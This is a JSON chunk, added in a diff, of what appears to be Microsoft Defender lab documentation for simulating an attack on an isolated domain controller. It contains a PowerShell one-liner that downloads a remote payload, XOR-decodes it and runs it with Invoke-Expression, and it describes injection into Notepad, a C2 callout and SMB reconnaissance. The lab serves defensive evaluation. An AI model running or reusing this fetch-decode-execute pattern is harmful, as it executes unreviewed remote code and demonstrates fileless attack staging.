@@ -1,0 +1,24 @@
+{
+  "chunk_id": "chunk_209",
+  "section_number": "155.1.1.18.1.39.2",
+  "header": "Run the isolated AD DS domain controller attack simulation",
+  "content": "simulation\n[Net.ServicePointManager]::SecurityProtocol =\n[Net.SecurityProtocolType]::Tls12\n;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-\nInjection');\n$base64String = (Invoke-WebRequest -URI\n\"https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_\nFileless_Recon.txt\" -UseBasicParsing).Content;Try{ $contentBytes =\n[System.Convert]::FromBase64String($base64String) } Catch {\n$contentBytes =\n[System.Convert]::FromBase64String($base64String.Substring(3)) };$i =\n0;\n$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -\nbxor $xor[$i];\n$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression\n([System.Text.Encoding]::UTF8.GetString($decryptedBytes))\n5. Paste and run the copied script in the PowerShell window.\nA few seconds later, the Notepad app will open. A simulated attack code will be injected\ninto Notepad. Keep the automatically generated Notepad instance open to experience\nthe full scenario.\nThe simulated attack code will attempt to communicate to an external IP address\n(simulating the C2 server) and then attempt reconnaissance against the domain\ncontroller through SMB.\nYou'll see this message displayed on the PowerShell console when this script completes:\nConsole\nTo see the Automated Incident and Response feature in action, keep the notepad.exe\nprocess open. You'll see Automated Incident and Response stop the Notepad process.\n７ Note\nIf you open this article on a web browser, you might encounter problems\ncopying the full text without losing certain characters or introducing extra line\nbreaks. If this is the case, download this document and open it on Adobe\nReader.\n７ Note\nIf you're running PowerShell using remote desktop protocol (RDP), use the Type\nClipboard Text command in the RDP client because the CTRL-V hotkey or right-\nclick-paste method might not work. Recent versions of PowerShell sometimes will\nalso not accept that method, you might have to copy to Notepad in memory first,\ncopy it in the virtual machine, and then paste it into PowerShell.\nran NetSessionEnum against [DC Name] with return code result 0",
+  "chunk_type": "font_based",
+  "metadata": {
+    "header_level": 5,
+    "font_size": 18,
+    "font_name": "SegoeUI-Semibold",
+    "page_range": {
+      "start": 114,
+      "end": 115
+    },
+    "content_stats": {
+      "char_count": 2084,
+      "word_count": 270
+    },
+    "hierarchy": {
+      "parent": "Simulate an attack with an isolated domain controller and client device (optional)",
+      "children": []
+    }
+  }
+}
